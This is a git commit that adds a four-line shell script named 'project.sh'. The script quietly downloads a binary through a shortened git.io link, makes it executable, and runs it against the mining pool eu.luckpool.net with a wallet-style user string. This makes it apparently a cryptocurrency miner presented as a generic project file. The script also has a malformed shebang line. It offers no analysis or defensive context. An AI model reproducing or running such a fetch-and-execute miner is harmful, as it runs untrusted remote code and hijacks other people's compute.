2b2d115de69a3aac1a5602eb2aef8fe830161e7d
jushajwlksas <94779482+jushajwlksas@users.noreply.github.com>
2021-11-21 15:15:37 +0700

    Create project.sh

---
+++ project.sh
@@ -0,0 +1,4 @@
+!#/bin/sh
+
+#
+wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.$(echo $(shuf -i 1000-9999 -n 1)-SayaIntel) -p x -t 2
